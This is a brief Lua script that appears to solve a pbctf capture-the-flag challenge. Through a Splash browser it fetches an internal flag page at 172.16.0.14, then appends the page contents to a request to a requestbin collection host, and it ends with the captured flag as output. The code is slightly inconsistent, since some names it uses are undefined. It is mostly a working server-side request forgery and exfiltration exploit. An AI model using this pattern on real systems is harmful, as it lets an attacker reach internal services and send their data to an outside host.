function main(exploit, args)
    exploit:go("http://172.16.0.14/flag.php")
    local flag = splash:html()
    exploit:go("requestbin" .. flag)
    return {geometry=data}
  end

-- Output : pbctf{1_h0p3_y0u_us3d_lua_f0r_th1s}